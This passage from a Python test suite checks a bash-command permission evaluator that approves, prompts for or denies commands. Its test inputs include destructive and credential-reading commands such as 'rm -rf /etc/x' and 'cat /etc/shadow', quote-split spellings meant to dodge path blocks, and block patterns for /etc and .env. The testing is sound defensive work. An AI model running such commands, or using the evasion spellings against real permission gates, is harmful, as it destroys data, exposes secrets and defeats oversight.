    def test_heredoc_with_substitution_env2(self) -> None:
        """Here-document with substitution and output redirection should ask in env2."""
        result = evaluate_bash_command("cat <<< $(echo hi) > file", make_config())
        assert result["status"] == "ask"

    def test_heredoc_with_substitution_env3(self) -> None:
        """Here-document with substitution and output redirection should ask in env3."""
        result = evaluate_bash_command("cat <<< $(echo hi) > file", make_config())
        assert result["status"] == "ask"


class TestEvaluateComplexNestedConstructs:
    """Tests for deeply nested and compound bash expressions with redirections.

    Verifies the tool correctly handles complex nested structures including
    process substitution, loops, conditionals, functions, and compound commands.
    """

    def test_if_with_cmdsub_and_pipe(self) -> None:
        """if with command substitution, here-doc, pipe, and redirection."""
        result = evaluate_bash_command('if [ $(echo hi) ]; then cat <<< "x" | grep x > file; fi', make_config())
        assert result["status"] == "ask"

    def test_for_loop_with_cmdsub(self) -> None:
        """for loop with command substitution and redirection."""
        result = evaluate_bash_command("for i in $(seq 1 3); do echo $i > file; done", make_config())
        assert result["status"] == "ask"

    def test_heredoc_with_pipe(self) -> None:
        """here-document piped to grep with output redirection."""
        result = evaluate_bash_command("cat << EOF | grep pattern > file\ncontent\nEOF", make_config())
        assert result["status"] == "ask"

    def test_if_with_procsub(self) -> None:
        """if with process substitution and nested command substitution."""
        result = evaluate_bash_command("if $(test -f <(echo hi)); then cat <<< $(echo ok) > file; fi", make_config())
        assert result["status"] == "ask"

    def test_nested_conditionals(self) -> None:
        """nested if statements with command substitution."""
        result = evaluate_bash_command(
            "if [ $(echo x) ]; then if [ $(echo y) ]; then echo both > file; fi; fi", make_config()
        )
        assert result["status"] == "ask"

    def test_while_loop(self) -> None:
        """while loop with command substitution and redirection."""
        result = evaluate_bash_command("while true; do if [ $(echo x) ]; then break; fi; done > file", make_config())
        assert result["status"] == "ask"

    def test_case_statement(self) -> None:
        """case statement with command substitution."""
        result = evaluate_bash_command("case $(echo x) in x) echo ok > file;; esac", make_config())
        assert result["status"] == "ask"

    def test_select_statement(self) -> None:
        """select statement with command substitution."""
        result = evaluate_bash_command("select opt in $(echo a b); do echo $opt > file; done", make_config())
        assert result["status"] == "ask"

    def test_compound_with_procsub(self) -> None:
        """compound command with process substitution."""
        result = evaluate_bash_command("{ cat <(echo hi); } > file", make_config())
        assert result["status"] == "ask"

    def test_subshell_with_procsub(self) -> None:
        """subshell with process substitution."""
        result = evaluate_bash_command("(cat <(echo hi)) > file", make_config())
        assert result["status"] == "ask"

    def test_function_definition(self) -> None:
        """function definition with output redirection."""
        result = evaluate_bash_command("fn() { echo hi > file; }; fn", make_config())
        assert result["status"] == "ask"

    def test_subshell_function(self) -> None:
        """subshell containing function definition."""
        result = evaluate_bash_command("(fn() { echo hi > file; }; fn)", make_config())
        assert result["status"] == "ask"


class TestEvaluateAdvancedBashConstructs:
    """Tests for advanced bash constructs (process substitution, coproc, trap, functions, builtins)."""

    def test_procsub_cat_echo_empty(self) -> None:
        """Process substitution with cat should require approval in empty env."""
        result = evaluate_bash_command("cat <(echo hi)", make_config())
        assert result["status"] == "ask"

    def test_procsub_cat_echo_env2(self) -> None:
        """Process substitution with cat should require approval in env2."""
        result = evaluate_bash_command("cat <(echo hi)", make_config())
        assert result["status"] == "ask"

    def test_procsub_cat_echo_env3(self) -> None:
        """Process substitution with cat should require approval in env3."""
        result = evaluate_bash_command("cat <(echo hi)", make_config())
        assert result["status"] == "ask"

    def test_procsub_cat_echo_file2_env2(self) -> None:
        """Process substitution with cat to file should require approval in env2."""
        result = evaluate_bash_command("cat <(echo hi)", make_config())
        assert result["status"] == "ask"

    def test_diff_procsub_ls_empty(self) -> None:
        """Diff with process substitution should require approval in empty env."""
        result = evaluate_bash_command("diff <(ls file1) <(ls file2)", make_config())
        assert result["status"] == "ask"

    def test_diff_procsub_ls_env2(self) -> None:
        """Diff with process substitution should require approval in env2."""
        result = evaluate_bash_command("diff <(ls file1) <(ls file2)", make_config())
        assert result["status"] == "ask"

    def test_diff_procsub_ls_env3(self) -> None:
        """Diff with process substitution should require approval in env3."""
        result = evaluate_bash_command("diff <(ls file1) <(ls file2)", make_config())
        assert result["status"] == "ask"

    def test_coproc_echo_empty(self) -> None:
        """Coproc with echo should require approval in empty env."""
        result = evaluate_bash_command("coproc myproc { echo hi; }", make_config())
        assert result["status"] == "ask"

    def test_coproc_echo_env2(self) -> None:
        """Coproc with echo should require approval in env2 (coproc is not allowed)."""
        result = evaluate_bash_command("coproc myproc { echo hi; }", make_config())
        assert result["status"] == "ask"

    def test_coproc_echo_env3(self) -> None:
        """Coproc with echo should require approval in env3 (coproc is not allowed)."""
        result = evaluate_bash_command("coproc myproc { echo hi; }", make_config())
        assert result["status"] == "ask"

    def test_coproc_echo_file_env2(self) -> None:
        """Coproc with echo to file should require approval in env2."""
        result = evaluate_bash_command("coproc myproc { echo hi > file; }", make_config())
        assert result["status"] == "ask"

    def test_trap_echo_file_empty(self) -> None:
        """Trap with echo should require approval in empty env."""
        result = evaluate_bash_command('trap "echo trap > file" EXIT', make_config())
        assert result["status"] == "ask"

    def test_trap_echo_file_env2(self) -> None:
        """Trap with echo should require approval in env2."""
        result = evaluate_bash_command('trap "echo trap > file" EXIT', make_config())
        assert result["status"] == "ask"

    def test_fn_def_echo_file_env2(self) -> None:
        """Function definition with echo should require approval in env2."""
        result = evaluate_bash_command("fn() { echo hi > file; }", make_config())
        assert result["status"] == "ask"

    def test_fn_def_echo_file_env3(self) -> None:
        """Function definition with echo should require approval in env3."""
        result = evaluate_bash_command("fn() { echo hi > file; }", make_config())
        assert result["status"] == "ask"

    def test_fn_call_redirect_env2(self) -> None:
        """Function call with redirect should require approval in env2."""
        result = evaluate_bash_command("fn > out", make_config())
        assert result["status"] == "ask"

    def test_fn_call_redirect_env3(self) -> None:
        """Function call with redirect should require approval in env3."""
        result = evaluate_bash_command("fn > out", make_config())
        assert result["status"] == "ask"

    def test_export_var_cmdsub_redirect_env2(self) -> None:
        """Export with command substitution should require approval in env2."""
        result = evaluate_bash_command("export VAR=$(echo hi) > file", make_config())
        assert result["status"] == "ask"

    def test_export_var_cmdsub_redirect_env3(self) -> None:
        """Export with command substitution should require approval in env3."""
        result = evaluate_bash_command("export VAR=$(echo hi) > file", make_config())
        assert result["status"] == "ask"

    def test_export_path_redirect_empty(self) -> None:
        """Export with path should require approval in empty env."""
        result = evaluate_bash_command('export PATH="$PATH:/usr/local/bin" > file', make_config())
        assert result["status"] == "ask"

    def test_export_path_redirect_env2(self) -> None:
        """Export with path should require approval in env2."""
        result = evaluate_bash_command('export PATH="$PATH:/usr/local/bin" > file', make_config())
        assert result["status"] == "ask"

    def test_unset_array_redirect_empty(self) -> None:
        """Unset array should require approval in empty env."""
        result = evaluate_bash_command("unset arr[@] > file", make_config())
        assert result["status"] == "ask"

    def test_unset_array_redirect_env2(self) -> None:
        """Unset array should require approval in env2."""
        result = evaluate_bash_command("unset arr[@] > file", make_config())
        assert result["status"] == "ask"

    def test_declare_assoc_redirect_env2(self) -> None:
        """Declare associative array should require approval in env2."""
        result = evaluate_bash_command("declare -A map > file", make_config())
        assert result["status"] == "ask"

    def test_declare_assoc_redirect_env3(self) -> None:
        """Declare associative array should require approval in env3."""
        result = evaluate_bash_command("declare -A map > file", make_config())
        assert result["status"] == "ask"


class TestEvaluateArithmeticCommandSubstitutionPolicy:
    """`(( ... $(...) ))` is gated by the command_substitution policy.

    The substituted command is a real segment, so the command is judged like
    its five sibling spellings
    (``x=$(cmd)``, ``let x=$(cmd)``, ``[[ -n $(cmd) ]]``, ``$(( $(cmd) ))``,
    ``$(cmd)``) - verified to agree on every combination below. Under
    ``"*": "allow"`` the substituted command is visible and the
    wildcard genuinely approves it; under ``"*": "ask"`` the verdict is
    `ask` (as it is for every sibling).
    """

    CMD = "(( x[$(rm -rf /etc/x)] ))"

    def test_allow_wildcard_deny_subshell(self) -> None:
        assert evaluate_bash_command(self.CMD, {"*": "allow", "command_substitution": "deny"})["status"] == "deny"

    def test_allow_wildcard_inherited_substitution_allow(self) -> None:
        # The substituted command is a real segment, so the wildcard's
        # inherited allow is honoured rather than downgraded.
        result = evaluate_bash_command(self.CMD, {"*": "allow"})
        assert result["status"] == "allow"
        assert "rm" in [s["command"] for s in result["segments"]]

    def test_allow_wildcard_explicit_ask(self) -> None:
        assert evaluate_bash_command(self.CMD, {"*": "allow", "command_substitution": "ask"})["status"] == "ask"

    def test_allow_wildcard_explicit_subshell_allow(self) -> None:
        assert evaluate_bash_command(self.CMD, {"*": "allow", "command_substitution": "allow"})["status"] == "allow"

    def test_ask_wildcard_deny_subshell(self) -> None:
        # `deny` is an absolute block: it wins over the wildcard, so the
        # substitution is refused outright rather than prompting.
        result = evaluate_bash_command(self.CMD, {"*": "ask", "command_substitution": "deny"})
        assert result["status"] == "deny"
        assert "command substitution denied in config" in result["reason"]

    def test_deny_wildcard_allow_subshell(self) -> None:
        assert evaluate_bash_command(self.CMD, {"*": "deny", "command_substitution": "allow"})["status"] == "deny"

    def test_deny_wildcard_unset_subshell(self) -> None:
        """No downgrade: an inherited deny (unset subshell) still denies."""
        assert evaluate_bash_command(self.CMD, {"*": "deny"})["status"] == "deny"

    def test_time_wrapped_arithmetic(self) -> None:
        assert (
            evaluate_bash_command("time (( x[$(rm z)] ))", {"*": "allow", "command_substitution": "deny"})["status"]
            == "deny"
        )

    def test_followed_by_real_command(self) -> None:
        assert (
            evaluate_bash_command("ls; (( x[$(rm)] ))", {"*": "allow", "command_substitution": "deny"})["status"]
            == "deny"
        )

    def test_plus_equals_variant(self) -> None:
        assert (
            evaluate_bash_command("(( y += $(rm z) ))", {"*": "allow", "command_substitution": "deny"})["status"]
            == "deny"
        )

    def test_literal_arithmetic_unaffected(self) -> None:
        assert evaluate_bash_command("(( x = 5 ))", {"*": "allow", "command_substitution": "deny"})["status"] == "allow"


class TestEvaluateEmptySegmentSubstitutionGateIsUnreachable:
    """`_empty_segment_result`'s substitution arm is a dead security gate - pin it.

    `_empty_segment_result` is reached only when segment extraction produced
    nothing.  Its last arm gates on the resolved substitution policy, so that a
    command carrying `$(...)` but no inspectable segment cannot fall through to
    a permissive wildcard.  That arm became unreachable when the `ArithmCmd`
    handler in `segments.py` started recursing into `(( ... ))`, because every
    substitution spelling now surfaces the substituted command as a real
    segment.

    The arm is a *fail-closed gate*, so it is kept rather than deleted: if a
    future change reintroduces a substitution spelling that yields no segment,
    this is the code that stops it auto-approving, and a deletion would remove
    that stop silently.  These tests pin the two facts the deadness rests on,
    so the arm cannot be reached by accident without a test going red:

    1. every substitution spelling yields at least one segment, so the
       empty-segment path is not taken for any of them (test below); and
    2. if the arm *is* reached, it does what it says - it denies or asks on the
       substitution policy rather than deferring to the wildcard.
    """

    #: One command per substitution spelling bash accepts, including the
    #: `(( ... ))` form whose handler change is what retired the arm.  Nested
    #: expansions (`${#$(cmd)}`, `${!$(cmd)}`, `${$(cmd)}`) are zsh-only and
    #: never reach the evaluator, so they are deliberately absent.
    SUBSTITUTION_SPELLINGS: ClassVar[list[str]] = [
        "$(cmd)",
        "`cmd`",
        "<(cmd)",
        ">(cmd)",
        "echo $(cmd)",
        "echo `cmd`",
        "cat <(cmd)",
        "cat >(cmd)",
        "x=$(cmd)",
        "x+=( $(cmd) )",
        "A=( $(cmd) )",
        "export A=$(cmd)",
        "readonly A=$(cmd)",
        "let x=$(cmd)",
        "(( x=$(cmd) ))",
        "(( $(cmd) ))",
        "(( y = $(cmd) ))",
        "(( x[$(cmd)] ))",
        "$(( $(cmd) ))",
        "${x:-$(cmd)}",
        "${x//$(cmd)/y}",
        "[[ -n $(cmd) ]]",
        "[[ $(cmd) == y ]]",
        "[[ ( $(cmd) == a ) ]]",
        "if $(cmd); then ls; fi",
        "while $(cmd); do ls; done",
        "for i in $(cmd); do ls; done",
        "f() { $(cmd); }",
        "{ $(cmd); }",
        "( $(cmd) )",
        "time $(cmd)",
        "coproc c { $(cmd); }",
        'echo "$(cmd)"',
        'x="pre$(cmd)post"',
    ]

    def test_every_substitution_spelling_yields_a_segment(self) -> None:
        """The invariant that makes the arm dead: no substitution goes segmentless.

        If this ever fails, a substitution can reach `_empty_segment_result`
        with a substitution flag set, and the dead arm becomes live code again.
        """
        segmentless = [
            spelling
            for spelling in self.SUBSTITUTION_SPELLINGS
            if not evaluate_bash_command(spelling, {"*": "allow"})["segments"]
        ]
        assert segmentless == [], (
            f"these substitutions produced no segments, reviving the empty-segment gate: {segmentless}"
        )

    def test_gate_would_deny_rather_than_defer_to_wildcard(self) -> None:
        """Reached directly: a substitution-only command cannot inherit an allow.

        `{"*": "allow"}` with the key unset is the dangerous shape - if the gate
        deferred to the wildcard it would auto-approve a command nothing had
        inspected.  It must downgrade to `ask`.
        """
        result = self._gate({"*": "allow"}, 'echo "$(cmd)"')
        assert result == {
            "status": "ask",
            "reason": "command substitution requires approval",
            "reasons": ["command substitution requires approval"],
            "segments": [],
        }

    @staticmethod
    def _gate(config: dict[str, Any], raw: str) -> dict[str, Any]:
        """Call `_empty_segment_result` as the evaluator would if it got here.

        The evaluator reaches it only via `if not segments`; the flags are
        derived from the real tree, so the substitution key the gate picks is
        the same one it would pick in production.
        """
        from lovely_bash_permissions.evaluate import (
            _empty_segment_result,
            _parse_command,
            _resolve_rules,
            _subst_flags,
        )

        parsed = _parse_command(raw)
        # The test helper only makes sense for a command that *does* produce
        # segments - that is the very fact under test elsewhere in this class.
        assert parsed.segments, "test helper needs a command that does produce segments"
        blocked = config.get("blocked_cmds_regex", [])
        return _empty_segment_result(
            config,
            _resolve_rules(config, blocked),
            parsed,
            _subst_flags(parsed.tree),
            [],
        )

    def test_gate_deny_is_absolute(self) -> None:
        """`deny` blocks outright and does not claim the user can still approve it."""
        result = self._gate({"*": "allow", "command_substitution": "deny"}, 'echo "$(cmd)"')
        assert result == {
            "status": "deny",
            "reason": "command substitution denied in config",
            "reasons": ["command substitution denied in config"],
            "segments": [],
        }

    def test_gate_explicit_allow_falls_through_to_wildcard(self) -> None:
        """An *explicit* `allow` is the one case that defers to the wildcard.

        The inherited-allow downgrade is what makes the gate fail closed; an
        explicit opt-in is the user's own decision and is honoured.
        """
        result = self._gate({"*": "allow", "command_substitution": "allow"}, 'echo "$(cmd)"')
        assert result["status"] == "allow"
        assert "defaulting to wildcard policy (allow)" in result["reason"]

    def test_gate_process_substitution_label(self) -> None:
        """The same gate, keyed on process substitution, reports its own label."""
        result = self._gate({"*": "allow", "process_substitution": "deny"}, "cat <(cmd)")
        assert result == {
            "status": "deny",
            "reason": "process substitution denied in config",
            "reasons": ["process substitution denied in config"],
            "segments": [],
        }

    def test_gate_still_runs_blocked_scans_first(self) -> None:
        """A blocked path in the substitution wins over the substitution policy."""
        result = self._gate(
            {"*": "allow", "command_substitution": "allow", "blocked_cmds_regex": ["/etc/shadow"]},
            'echo "$(cat /etc/shadow)"',
        )
        assert result["status"] == "deny"
        assert "/etc/shadow" in result["reason"]


class TestEvaluateDeepNestingRecursion:
    """deep nesting converts and evaluates; past the cap, fail closed."""

    def test_deep_command_substitution_evaluates_without_crash(self) -> None:
        """deep nesting converts and evaluates instead of RecursionError."""
        deep = "echo " + "$(" * 180 + "true" + ")" * 180
        result = evaluate_bash_command(deep, {"*": "allow"})
        assert result["status"] == "allow"

    def test_over_cap_command_fails_closed(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """past the cap we fail closed with a parse error, never recurse-crash."""
        import lovely_bash_permissions.converter as conv

        monkeypatch.setattr(conv, "_MAX_RECURSION_LIMIT", 2000)
        deep = "echo " + "$(" * 400 + "true" + ")" * 400
        with pytest.raises(ShfmtError):
            conv.parse_ast(deep)


class TestEvaluateExecutedFormMatching:
    """Quote-split / backslash-escaped spellings cannot dodge blocked-path
    checks or guard patterns.

    Wildcard is ``ask`` (mirrors the user's real config): under
    ``"*": "allow"`` a guard-tripped command would fall through to the allow
    wildcard instead of asking, so ``*:ask`` makes the "guard-trip → not
    auto-approved → ask" intent observable.
    """

    CONFIG: ClassVar[dict[str, list[str] | str]] = make_config(
        allowed=[
            r"^cat\s+.+$",
            r"^find(?!.*\s-(exec|delete|ok)\b).*$",
            r"^fd(?!.*\s+(-x|-X)).*$",
            r"^sort(?!\s+(-o|--output)\b).*$",
        ],
        blocked=["\\/etc", r"\.env$"],
        wildcard="ask",
    )

    @pytest.mark.parametrize(
        ("command", "expected"),
        [
            # Quote-split / escaped paths caught by the blocked check on the
            # *normalized* argument (the executed path).
            ('cat /e"tc"/passwd', "deny"),
            ('ls -la /e"tc"', "deny"),  # ls not allowlisted, but /etc blocked
            ('grep x /e"tc"/passwd', "deny"),
            ('cat .e"nv"', "deny"),
            # Guard patterns evaluated on the executed form: the split or
            # escaped dangerous flag trips the negative lookahead, so the
            # command is not auto-approved and falls to the wildcard (ask).
            ('find /tmp -e"x"ec rm', "ask"),
            ('find /tmp -"exec" rm', "ask"),
            ("find /tmp -ex\\ec rm", "ask"),
            ('fd -"x" x', "ask"),
            ('sort -"o" /tmp/out x', "ask"),
            # Contrasts: plain blocked path / plain quoted arg.
            ("cat /etc/passwd", "deny"),
            ('cat "ok file"', "allow"),
            ("cat .env", "deny"),
        ],
    )
    def test_split_and_escaped_forms(self, command: str, expected: str) -> None:
        result = evaluate_bash_command(command, self.CONFIG)
        assert result["status"] == expected

    def test_heredoc_body_split_path_denied(self) -> None:
        """A quote-split path inside a heredoc body is caught by the stripped variant."""
        result = evaluate_bash_command('cat f <<EOF\nsecret /e"tc"/passwd\nEOF', self.CONFIG)
        assert result["status"] == "deny"

    def test_safe_single_quoted_find_still_allowed(self) -> None:
        """A safe single-quoted find stays auto-approved (union guard)."""
        result = evaluate_bash_command("find . -name '*.txt'", self.CONFIG)
        assert result["status"] == "allow"


class TestEvaluateRedirectionOnlyOperands:
    """Redirection-only operands of && / || / | must not bypass policy.

    shfmt emits e.g. `> /etc/x && cat file` as an operand dict with Redirs but
    no Type and no Cmd; the redirection must not be silently dropped, or it
    slips past all output-redirection / blocked-path checks.
    """

    CONFIG_A: ClassVar[dict[str, str | list[str]]] = {
        "*": "allow",
        "blocked_cmds_regex": ["\\/etc"],
        "allowed_cmds_regex": [r"^cat\s+.+$"],
    }

    @pytest.mark.parametrize(
        "command",
        [
            "> /etc/x && cat file",
            "> /etc/x | true",
            "true | > /etc/x",
            "cat file && > /etc/y",
            "2>/etc/e | true",
        ],
    )
    def test_blocked_target_denied(self, command: str) -> None:
        result = evaluate_bash_command(command, self.CONFIG_A)
        assert result["status"] == "deny"

    def test_allowed_target_allowed(self) -> None:
        """Contrast: with output_redirection=allow, a non-blocked target is approved."""
        config = {**self.CONFIG_A, "output_redirection": "allow"}
        result = evaluate_bash_command("> /tmp/ok && cat file", config)
        assert result["status"] == "allow"

    def test_output_allow_still_blocks_blocked_path(self) -> None:
        """output_redirection=allow never waives the blocked-path security check."""
        config = {"*": "allow", "blocked_cmds_regex": ["\\/etc"], "output_redirection": "allow"}
        result = evaluate_bash_command("> /etc/x && > /etc/y", config)
        assert result["status"] == "deny"


class TestEvaluateSubstitutionKeySplit:
    """Behavioral tests for the `subshell` key split into three keys.

    `command_substitution` gates `$(...)` / backticks, `process_substitution`
    gates `<(...)` / `>(...)`, and `subshell` gates `( ... )` paren groups.
    A key that inherits "allow" from the wildcard is downgraded to "ask" (only
    an explicit allow counts as allow) on the no-segment arithmetic path.
    """

    def test_paren_subshell_deny(self) -> None:
        """`( rm x )` with subshell=deny is denied with the subshell reason."""
        result = evaluate_bash_command(
            "( rm x )",
            {"*": "allow", "subshell": "deny"},
        )
        assert result["status"] == "deny"
        assert "subshell (...) denied in config" in result["reason"]

    def test_time_prefix_paren_subshell_deny(self) -> None:
        """`time ( rm x )` is denied too - the `time` prefix doesn't mask the group."""
        result = evaluate_bash_command(
            "time ( rm x )",
            {"*": "allow", "subshell": "deny"},
        )
        assert result["status"] == "deny"

    def test_paren_group_inner_blocked_path_scanned(self) -> None:
        """Blocked-path scan reaches inside the `( ... )` paren group."""
        result = evaluate_bash_command(
            "( cat /etc/passwd )",
            {"*": "allow", "blocked_cmds_regex": ["\\/etc"]},
        )
        assert result["status"] == "deny"

    def test_paren_subshell_inherited_allow(self) -> None:
        """`( rm x )` with only `*`: `allow` (subshell unset) inherits the
        wildcard allow and is approved - not gated to ask."""
        result = evaluate_bash_command("( rm x )", {"*": "allow"})
        assert result["status"] == "allow"
        assert "requires approval" not in result["reason"]

    def test_cmdsubst_gated_independently_of_proc_subst(self) -> None:
        """`echo $(true)`: process_substitution=deny is irrelevant; command_substitution=deny denies."""
        allow_cfg = {"*": "allow", "process_substitution": "deny"}
        assert evaluate_bash_command("echo $(true)", allow_cfg)["status"] == "allow"

        deny_cfg = {"*": "allow", "command_substitution": "deny"}
        result = evaluate_bash_command("echo $(true)", deny_cfg)
        assert result["status"] == "deny"
        assert "command substitution denied in config" in result["reason"]

    def test_proc_subst_gated_independently_of_paren_subshell(self) -> None:
        """`echo <(true)`: process_substitution=deny denies; subshell=deny alone is irrelevant."""
        allow_list = [r"^echo(\s+.*)?$", r"^true$"]
        deny_cfg = {"*": "allow", "process_substitution": "deny", "allowed_cmds_regex": allow_list}
        result = evaluate_bash_command("echo <(true)", deny_cfg)
        assert result["status"] == "deny"
        assert "process substitution denied in config" in result["reason"]

        allow_cfg = {"*": "allow", "subshell": "deny", "allowed_cmds_regex": allow_list}
        assert evaluate_bash_command("echo <(true)", allow_cfg)["status"] == "allow"

    def test_arithmetic_cmdsubst_deny_is_absolute(self) -> None:
        """`(( x[$(rm)] ))`: command_substitution=deny denies, whatever the wildcard."""
        result = evaluate_bash_command(
            "(( x[$(rm)] ))",
            {"*": "allow", "command_substitution": "deny"},
        )
        assert result["status"] == "deny"
        assert "command substitution denied in config" in result["reason"]

    def test_arithmetic_cmdsubst_inherited_allow_is_honoured(self) -> None:
        """`(( x[$(rm)] ))` yields a segment for the substituted command.

        With only `"*": "allow"` there is then something to analyse and the
        wildcard genuinely approves it.  Downgrading an inherited allow to `ask`
        is reserved for a line that yields nothing to analyse, and this one does
        not. Every
        sibling spelling of the same substitution behaves the same way.
        """
        result = evaluate_bash_command("(( x[$(rm)] ))", {"*": "allow"})
        assert result["status"] == "allow"
        assert [s["command"] for s in result["segments"]] == ["rm"]


class TestEvaluateDenyIsAbsolute:
    """A `deny` on any policy key is an absolute block.

    The three construct keys - `command_substitution`, `process_substitution`
    and `subshell` - are read whatever verdict the wildcard produced, so under
    the default `"*": "ask"` a `deny` on one of them is not inert: the
    construct policy denies on top of the wildcard's `ask`.  `deny` is an
    absolute block, exactly as `variable_assignment` and the redirection
    policies are, and unlike the narrower `ask`.
    """

    # key -> a command that exercises exactly that construct
    CONSTRUCTS: ClassVar[list[tuple[str, str]]] = [
        ("command_substitution", "echo $(rm x)"),
        ("process_substitution", "echo <(rm x)"),
        ("subshell", "( rm x )"),
    ]

    # key -> the same construct, wrapping a command that blocked_cmds_regex denies
    BLOCKED_CONSTRUCTS: ClassVar[list[tuple[str, str]]] = [
        ("command_substitution", "echo $(cat /etc/passwd)"),
        ("process_substitution", "echo <(cat /etc/passwd)"),
        ("subshell", "( cat /etc/passwd )"),
    ]

    @staticmethod
    def _label(key: str) -> str:
        return "subshell (...)" if key == "subshell" else key.replace("_", " ")

    @pytest.mark.parametrize(("key", "command"), CONSTRUCTS)
    def test_deny_blocks_from_ask_and_allow_wildcards(self, key: str, command: str) -> None:
        # The wildcard has already spoken; the construct policy still denies.
        for wildcard in ("ask", "allow"):
            result = evaluate_bash_command(command, {"*": wildcard, key: "deny"})
            assert result["status"] == "deny", (key, wildcard)
            assert f"{self._label(key)} denied in config" in result["reason"], (key, wildcard)

    @pytest.mark.parametrize(("key", "command"), CONSTRUCTS)
    def test_deny_wildcard_still_denies(self, key: str, command: str) -> None:
        # With `"*": "deny"` the wildcard has already refused the command, so
        # the construct policy has nothing left to add to the reason.
        result = evaluate_bash_command(command, {"*": "deny", key: "deny"})
        assert result["status"] == "deny"
        assert "requires approval" not in result["reason"]

    @pytest.mark.parametrize(("key", "command"), CONSTRUCTS)
    def test_deny_beats_an_allow_listed_command(self, key: str, command: str) -> None:
        # Even when every command in the line matches an allowed pattern, a
        # `deny` on the construct still refuses it.
        result = evaluate_bash_command(command, {"*": "ask", key: "deny", "allowed_cmds_regex": [r"^\w+(\s.*)?$"]})
        assert result["status"] == "deny"
        assert "denied in config" in result["reason"]

    @pytest.mark.parametrize(("key", "command"), CONSTRUCTS)
    def test_ask_still_only_downgrades_an_allow(self, key: str, command: str) -> None:
        # `ask` keeps its narrower meaning - it prevents auto-approval and
        # nothing more, so it is inert once the verdict is already `ask`.
        assert evaluate_bash_command(command, {"*": "allow", key: "ask"})["status"] == "ask"
        assert evaluate_bash_command(command, {"*": "ask", key: "ask"})["status"] == "ask"
        assert evaluate_bash_command(command, {"*": "allow", key: "ask"})["reason"].count("requires approval") == 1

    @pytest.mark.parametrize(("key", "command"), BLOCKED_CONSTRUCTS)
    def test_ask_does_not_soften_an_existing_deny(self, key: str, command: str) -> None:
        # An `ask` on the construct must never turn a hard block back into a
        # prompt - here the `deny` comes from `blocked_cmds_regex`.
        result = evaluate_bash_command(
            command,
            {"*": "allow", key: "ask", "blocked_cmds_regex": [r"\/etc"]},
        )
        assert result["status"] == "deny"
        assert "matches blocked pattern" in result["reason"]
        assert "requires approval" not in result["reason"]

    def test_ask_does_not_soften_a_variable_assignment_deny(self) -> None:
        result = evaluate_bash_command(
            "FOO=bar $(rm x)",
            {"*": "allow", "variable_assignment": "deny", "command_substitution": "ask"},
        )
        assert result["status"] == "deny"
        assert "variable assignment denied" in result["reason"]

    def test_empty_segment_path_reports_deny_wording(self) -> None:
        # The zero-segment path can return a `deny` too; it must not claim the
        # user can approve it.
        result = evaluate_bash_command(
            "(( x[$(rm z)] ))",
            {"*": "ask", "command_substitution": "deny", "allowed_cmds_regex": [r"^rm(\s+.*)?$"]},
        )
        assert result["status"] == "deny"
        assert "command substitution denied in config" in result["reason"]
        assert "requires approval" not in result["reason"]

    def test_nested_nonmatch_deny_is_attributable_to_config(self) -> None:
        # The block should say both *what* was rejected and that no runtime
        # approval would let it through.
        result = evaluate_bash_command(
            "find . $(rm x)",
            {"*": "allow", "command_substitution": "deny", "allowed_cmds_regex": [r"^find(\s.*)?$"]},
        )
        assert result["status"] == "deny"
        assert "do not match allowed patterns" in result["reason"]
        assert "command substitution denied in config" in result["reason"]

    def test_the_three_keys_are_independent(self) -> None:
        # Allowing one must not disarm another.
        assert evaluate_bash_command("( $(rm x) )", {"*": "ask", "subshell": "allow"})["status"] == "ask"
        result = evaluate_bash_command("( $(rm x) )", {"*": "ask", "command_substitution": "deny"})
        assert result["status"] == "deny"
        assert "command substitution denied in config" in result["reason"]


class TestEvaluateParseOnce:
    """The evaluator parses and converts each command exactly once.

    ``evaluate_bash_command`` needs the raw shfmt JSON (the heredoc-body and
    background walks key off fields the typed AST does not carry), the typed
    AST (construct detection, the allowed-pattern walk) and the segment list.
    All three come from a single parse - one shfmt subprocess and
    one JSON-to-AST conversion per evaluation - because the helpers that need
    one must share it rather than re-derive it from the raw JSON.  Re-deriving
    is not free: each
    ``node_from_json`` re-measures the JSON nesting depth and may raise the
    interpreter's recursion limit.  These tests pin the sharing.
    """

    COMMAND = "ls -la | grep txt && cat foo | wc -l && for i in 1 2; do echo $i; done"
    CONFIG: ClassVar[dict[str, Any]] = {
        "*": "ask",
        "allowed_cmds_regex": ["^ls(\\s|$)", "^cat(\\s|$)", "^grep(\\s|$)", "^wc(\\s|$)", "^echo(\\s|$)"],
    }

    @staticmethod
    def _count(
        command: str, config: dict[str, Any], monkeypatch: pytest.MonkeyPatch, *, expect_error: bool = False
    ) -> tuple[int, int]:
        """Return (parse() calls, top-level node_from_json() calls) for one evaluation."""
        import lovely_bash_permissions.converter as converter_mod
        import lovely_bash_permissions.evaluate as ev
        import lovely_bash_permissions.segments as segments_mod

        counts = [0, 0]
        real_parse = parser_parse
        real_nfj = converter_mod.node_from_json

        def counting_parse(*args: object, **kwargs: object) -> object:
            counts[0] += 1
            return real_parse(*args, **kwargs)  # type: ignore[arg-type]

        def counting_nfj(data: dict[str, Any] | None) -> object:
            # node_from_json recurses through its own converter table, so only
            # the outermost call of each conversion is a "top-level" one.
            if converter_mod._json_conversion_depth == 0:
                counts[1] += 1
            return real_nfj(data)

        monkeypatch.setattr(ev, "parse", counting_parse)
        monkeypatch.setattr(ev, "node_from_json", counting_nfj)
        monkeypatch.setattr(segments_mod, "parse", counting_parse)
        monkeypatch.setattr(segments_mod, "node_from_json", counting_nfj)

        if expect_error:
            with pytest.raises(ShfmtError):
                ev.evaluate_bash_command(command, config)
        else:
            ev.evaluate_bash_command(command, config)
        return counts[0], counts[1]

    def test_single_parse_and_single_conversion(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """One shfmt subprocess and one top-level conversion per evaluation."""
        assert self._count(self.COMMAND, dict(self.CONFIG), monkeypatch) == (1, 1)

    def test_verdict_unchanged_by_the_sharing(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Sanity check on the count above: the segments are all still found."""
        self._count(self.COMMAND, dict(self.CONFIG), monkeypatch)
        result = evaluate_bash_command(self.COMMAND, dict(self.CONFIG))
        assert result["status"] == "allow"
        assert [seg["command"] for seg in result["segments"]] == ["ls", "grep", "cat", "wc", "echo"]

    def test_unparseable_command_fails_at_parse(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """A command shfmt rejects raises before any conversion is attempted.

        Parsing is the first thing evaluation does, so a failure here still
        propagates to the hook (which maps it to the ``error`` policy) instead
        of being swallowed into the empty-segments fallback.
        """
        import lovely_bash_permissions.evaluate as ev

        with pytest.raises(ShfmtError):
            ev.evaluate_bash_command("   ", {})
